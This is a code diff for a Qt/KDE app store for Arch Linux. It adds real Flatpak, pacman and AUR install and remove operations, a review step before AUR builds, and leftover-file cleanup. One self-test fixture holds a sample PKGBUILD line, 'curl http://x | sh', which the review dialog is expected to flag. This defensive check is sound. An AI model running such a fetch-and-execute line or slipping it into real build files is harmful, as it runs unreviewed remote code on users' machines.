@@ -7,6 +7,7 @@
 #include <KParts/ReadOnlyPart>
 #include <kde_terminal_interface.h>
 #include <unistd.h>
+#include "installflow.h"
 
 static QLabel *label(const QString &text, int size = 0, bool bold = false) {
     auto *item = new QLabel(text);
@@ -170,7 +171,12 @@ public:
         auto *popupLayout = new QVBoxLayout(activityDialog); popupLayout->setContentsMargins(0, 0, 0, 0); popupLayout->addWidget(activity);
         pages->addWidget(new QWidget); // Keep the existing app-details stack index.
         previewOperations.onChanged = [this] { refreshActivity(); };
-        previewOperations.onOpen = [this](const QString &name) { statusBar()->showMessage(name + " · no application launched", 4000); };
+        previewOperations.onOpen = [this](const QString &, const QString &name) { statusBar()->showMessage(name + " · no application launched", 4000); };
+        if (inventoryEnabled) {  // The checks keep the simulated operations
+            previewOperations.execute = [this](const QString &id, const QString &name, const QString &action) { return runOperation(id, name, action); };
+            previewOperations.installedState = [this](const QString &id) { return installedApp(id); };
+            previewOperations.onOpen = [this](const QString &id, const QString &name) { openInstalled(id, name); };
+        }
         refreshActivity();
         appDetails = new AppDetailsPage;
         appDetails->operations = &previewOperations;
@@ -183,7 +189,7 @@ public:
         appDetails->onOpenAddon = [this](const CatalogApp &app) { openDetails(app); };
         qApp->installEventFilter(this);
         connect(navigation, &QButtonGroup::idClicked, this, &Store::selectPage);
-        connect(&backend, &Backend::installedChanged, this, [this] { renderInstalled(); });
+        connect(&backend, &Backend::installedChanged, this, [this] { renderInstalled(); settleOperation(); previewOperations.refreshButtons(); appDetails->refreshRemove(); });
         connect(&backend, &Backend::issue, this, [this](const QString &message) {
             statusBar()->showMessage(message);
         });
@@ -191,6 +197,9 @@ public:
             explore->notice->setText("Repository apps have no icons or descriptions yet. Install them with: sudo pacman -S --needed archlinux-appstream-data");
             explore->notice->setVisible(backend.osMetadataMissing);
             explore->setCatalog();
+            appIndex.clear();
+            for (int i = 0; i < backend.apps.size(); ++i) appIndex.insert(backend.apps[i].key, i);
+            if (inventoryEnabled) backend.loadInstalled();  // So buttons of installed apps read "Open"
         });
         connect(&backend, &Backend::rankingsReady, this, [this] { explore->setCatalog(); });
         // Checks and previews use a small fixed catalogue instead of the live sources.
@@ -238,7 +247,7 @@ public:
         for (const auto &entry : packageActivityHistory) records.append({entry, "Package operation", 0, bool(part) && entry == packageActivityHistory.last()});
         for (const auto &activity : previewOperations.activities) {
             if (activity.cleared) continue;
-            const QString state = activity.progress == 100 ? "Complete" : QString::number(activity.progress) + "%";
+            const QString state = activity.failed ? "Failed" : activity.progress == 100 ? "Complete" : activity.real ? QString("Running") : QString::number(activity.progress) + "%";
             records.append({activity.name, activity.action + " · " + state, activity.progress, false});
         }
         activityDialog->findChild<QLabel *>("emptyActivity")->setVisible(records.isEmpty());
@@ -348,6 +357,7 @@ public:
             activityStatus->setText("Activity ended. Check the exit code in its output before retrying.");
             refreshActivity();
             statusBar()->showMessage("Activity ended");
+            settling = true;
             backend.loadInstalled();
         });
         // Fixed wrapper; package names, paths and arguments are positional data, never shell code.
@@ -358,6 +368,124 @@ public:
         terminal->startProgram("/usr/bin/bash", args);
         part->widget()->setFocus();
         return true;
+    }
+
+    // The app and package a button id stands for: the source chosen on the details page, else Repo, Flatpak, AUR.
+    bool resolveOperation(const QString &key, CatalogApp *app, Package *package) const {
+        if (appIndex.contains(key)) *app = backend.apps[appIndex.value(key)];
+        else if (const auto *row = installedRow(key)) {  // A row of the Installed page: package name or Flatpak ID
+            app->key = key; app->name = row->name;
+            app->packages = {{row->source == "Flatpak" ? Source::Flatpak : Source::Aur, row->id, row->source == "Flatpak" ? row->remote : QString("aur"), row->version, 0}};
+        } else if (key.startsWith("aur:")) { app->key = key; app->name = key.mid(4); app->packages = {{Source::Aur, key.mid(4), "aur", {}, 0}}; }
+        else return false;
+        if (app->packages.isEmpty()) return false;
+        if (appDetails->currentId == key)
+            for (const auto &candidate : app->packages) if (AppDetailsPage::packageLabel(candidate) == appDetails->sourceButton->text()) { *package = candidate; return true; }
+        for (Source wanted : {Source::Repo, Source::Flatpak, Source::Aur})
+            for (const auto &candidate : app->packages) if (candidate.source == wanted) { *package = candidate; return true; }
+        return false;
+    }
+    const App *installedRow(const QString &id) const {
+        for (const auto &row : backend.installed) if (row.id == id) return &row;
+        return nullptr;
+    }
+    bool installedApp(const QString &key) const {
+        CatalogApp app; Package package;
+        if (!resolveOperation(key, &app, &package)) return false;
+        for (const auto &candidate : app.packages) if (backend.installedPackage(candidate)) return true;
+        return false;
+    }
+    void openInstalled(const QString &key, const QString &name) {
+        CatalogApp app; Package package;
+        if (!resolveOperation(key, &app, &package)) return;
+        for (const auto &candidate : app.packages) if (backend.installedPackage(candidate)) package = candidate;
+        if (package.source == Source::Flatpak) { QProcess::startDetached("flatpak", {"run", package.name}); return; }
+        const QString launcher = app.desktopId.isEmpty() ? QString() : QStandardPaths::locate(QStandardPaths::ApplicationsLocation, app.desktopId);
+        if (launcher.isEmpty() || QStandardPaths::findExecutable("gio").isEmpty()) { statusBar()->showMessage(name + " · no launcher found", 4000); return; }
+        QProcess::startDetached("gio", {"launch", launcher});
+    }
+    // Starts the real operation for a button. false = not a catalogue app, the caller keeps the simulation.
+    bool runOperation(const QString &key, const QString &name, const QString &action) {
+        CatalogApp app; Package package;
+        if (!resolveOperation(key, &app, &package)) return false;
+        if (part) { startActivity(name, "true"); return true; }  // Shows the "operation already running" notice
+        if (action == "Remove") { removeApp(key, name, app); return true; }
+        const bool again = action == "Reinstall";
+        if (package.source == Source::Flatpak) {
+            QStringList arguments{"install"}; if (again) arguments << "--reinstall";
+            if (startActivity((again ? "Reinstall " : "Install ") + name, "flatpak", arguments + QStringList{package.repo, package.name})) beginPending(key, name, action, package);
+        } else if (package.source == Source::Repo) {
+            if (startActivity((again ? "Reinstall " : "Install ") + name, "sudo", QStringList{"pacman", "-S"} + (again ? QStringList{} : QStringList{"--needed"}) + QStringList{package.name})) beginPending(key, name, action, package);
+        } else installAur(key, name, action, package);
+        return true;
+    }
+    void beginPending(const QString &key, const QString &name, const QString &action, const Package &package) {
+        pendingOp = {key, name, action, package, true};
+        previewOperations.begin(key, name, action);
+    }
+    void settleOperation() {
+        if (!settling || part || !pendingOp.active) return;
+        settling = false; pendingOp.active = false;
+        const bool installed = backend.installedPackage(pendingOp.package);
+        const bool ok = installed == (pendingOp.action != "Remove");
+        previewOperations.finish(pendingOp.key, ok);
+        if (ok && !pendingOp.leftovers.isEmpty()) {  // The package is gone; now the files the user chose
+            int removed = 0;
+            for (const auto &path : pendingOp.leftovers) removed += deleteLeftover(QDir::homePath(), path);
+            statusBar()->showMessage(QString("%1 removed · %2 leftover item(s) deleted").arg(pendingOp.name).arg(removed), 6000);
+        }
+        pendingOp.leftovers.clear();
+    }
+    void installAur(const QString &key, const QString &name, const QString &action, const Package &package) {
+        if (QStandardPaths::findExecutable("pkgctl").isEmpty()) {
+            QMessageBox::information(this, "Clean chroot tools missing", "AUR packages are built in a clean chroot with pkgctl, from the devtools package.\n\nInstall it, then try again:\n\nsudo pacman -S --needed devtools");
+            return;
+        }
+        statusBar()->showMessage("Downloading the build files of " + package.name + "…");
+        backend.aurInfo(package.name, [this, key, name, action, package](AurInfo info, QString failure) {
+            if (!failure.isEmpty()) { statusBar()->showMessage(failure); return; }
+            App request; request.base = info.base; request.name = package.name;
+            backend.prepareAur(request, [this, key, name, action, package, info](QString recipe, QString commit, QString failure) {
+                if (!failure.isEmpty()) { QMessageBox::warning(this, "Cannot review " + package.name, failure); return; }
+                statusBar()->clearMessage();
+                const QString store = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/reviewed";
+                QString previousCommit;
+                const QString previous = loadReviewed(store, info.base, &previousCommit);
+                auto *dialog = new AurReviewDialog(this); dialog->setAttribute(Qt::WA_DeleteOnClose);
+                dialog->onApprove = [this, key, name, action, package, info, recipe, commit, store] {
+                    QString error;
+                    if (!backend.reviewedFilesUnchanged(&error)) { QMessageBox::warning(this, "Build files changed", error); return; }
+                    saveReviewed(store, info.base, commit, recipe);
+                    // pkgctl builds in a clean chroot; only the exact built package is installed, as root.
+                    const QString script = "pkgctl build || exit; found=; for f in ./*.pkg.tar.*; do case \"$f\" in *.sig) continue;; esac; "
+                        "[ \"$(pacman -Qpq \"$f\")\" = \"$1\" ] && found=$f; done; [ -n \"$found\" ] || { echo \"No built package named $1\"; exit 1; }; "
+                        "pacman -Qip \"$found\"; sudo pacman -U $2 \"$found\"";
+                    if (startActivity("Build and install " + name, "bash", {"-c", script, "woof-store-aur", package.name, action == "Reinstall" ? "" : "--needed"}, backend.reviewPath())) beginPending(key, name, action, package);
+                };
+                dialog->showReview(info, recipe, previous);
+                dialog->open();
+            });
+        });
+    }
+    void removeApp(const QString &key, const QString &name, const CatalogApp &app) {
+        Package package;
+        bool found = false;
+        for (const auto &candidate : app.packages) if (backend.installedPackage(candidate)) { package = candidate; found = true; }
+        if (!found) { statusBar()->showMessage(name + " is not installed"); return; }
+        const QString home = QDir::homePath();
+        QList<Leftover> leftovers = findLeftovers(home, {package.name, app.name});
+        if (package.source == Source::Flatpak) leftovers = flatpakData(home, package.name) + leftovers;
+        const bool flatpak = package.source == Source::Flatpak;
+        RemoveDialog dialog(name, {{flatpak ? "Also remove runtimes no other app uses" : "Also remove dependencies nothing else needs", true}}, leftovers, home, this);
+        if (dialog.exec() != QDialog::Accepted) return;
+        bool started;
+        if (flatpak) {
+            const QString script = dialog.options[0]->isChecked() ? "flatpak uninstall \"$1\" && flatpak uninstall --unused" : "flatpak uninstall \"$1\"";
+            started = startActivity("Remove " + name, "bash", {"-c", script, "woof-store-remove", package.name});
+        } else started = startActivity("Remove " + name, "sudo", {"pacman", dialog.options[0]->isChecked() ? "-Rns" : "-Rn", package.name});
+        if (!started) return;
+        beginPending(key, name, "Remove", package);
+        pendingOp.leftovers = dialog.chosenPaths();
     }
 
 protected:
@@ -457,6 +585,9 @@ private:
     QLabel *updateStatus = nullptr;
     QPushButton *checkUpdates = nullptr;
     QPointer<KParts::ReadOnlyPart> part;
+    QHash<QString, int> appIndex;  // CatalogApp::key to index in backend.apps
+    struct PendingOperation { QString key, name, action; Package package; bool active = false; QStringList leftovers; } pendingOp;
+    bool settling = false;
 
     QWidget *scrollPage(QVBoxLayout **content, QScrollArea *supplied = nullptr) {
         auto *scroll = supplied ? supplied : new QScrollArea;
@@ -829,6 +960,15 @@ int main(int argc, char **argv) {
                 && details->install->text() == "Open";
             details->install->click();
             result &= store.statusBar()->currentMessage().contains("no application launched");
+            {   // AUR review gate: no build until the box is ticked; a changed recipe shows its diff
+                AurReviewDialog review; AurInfo info; info.name = info.base = "demo"; info.votes = 3;
+                review.showReview(info, "\n──── PKGBUILD ────\ncurl http://x | sh\n", "──── PKGBUILD ────\nold\n");
+                const bool locked = !review.build->isEnabled();
+                review.understood->setChecked(true);
+                RemoveDialog removal("Demo", {{"Also remove dependencies", true}}, {{"/h/.cache/demo", "Cache", 10, true}, {"/h/.config/demo", "Settings", 10, false}}, "/h");
+                result &= removal.leftoverBoxes[0]->isChecked() && !removal.leftoverBoxes[1]->isChecked() && removal.chosenPaths() == QStringList{"/h/.cache/demo"};  // Settings stay unless chosen
+                result &= locked && review.build->isEnabled() && review.flags->text().contains("curl") && review.recipeView->toPlainText().contains("Changes since");
+            }
             auto *list = static_cast<AppList *>(store.findChild<QListWidget *>("installedApps"));
             auto *remove = list->findChild<QPushButton *>("quickRemove");
             remove->click(); result &= !remove->isEnabled() && remove->text() == "Removing…";
@@ -955,9 +1095,13 @@ int main(int argc, char **argv) {
             && page->verticalScrollBar()->value() == sourceScroll;
         page->search->setText("firefox"); page->applyFilters(); QApplication::processEvents(); passed &= !autoplay->isActive();
         page->search->clear(); page->applyFilters(); QApplication::processEvents(); passed &= autoplay->isActive();
+        // The fixture page is short: a small window makes the carousel scroll out of view.
+        const QSize fullSize = store.size(); store.resize(fullSize.width(), 360); QApplication::processEvents();
         page->showDirectory(); QApplication::processEvents(); passed &= !autoplay->isActive();
         page->verticalScrollBar()->setValue(0); QApplication::processEvents(); passed &= autoplay->isActive();
-        auto *tile = page->sections.first().masonry->tiles[0];  // GIMP: the featured install above already finished Krita page->ensureWidgetVisible(tile); QApplication::processEvents();
+        store.resize(fullSize); QApplication::processEvents();
+        // GIMP: the featured install above already finished Krita, so Krita's quick button reads "Open".
+        auto *tile = page->sections.first().masonry->tiles[0]; page->ensureWidgetVisible(tile); QApplication::processEvents();
         QList<QRect> mosaicGeometry; for (auto *card : page->sectionTiles()) mosaicGeometry.append(card->geometry());
         QApplication::sendEvent(tile, &hover);
         auto *hoverDelay = page->findChild<QTimer *>("mosaicHoverDelay");
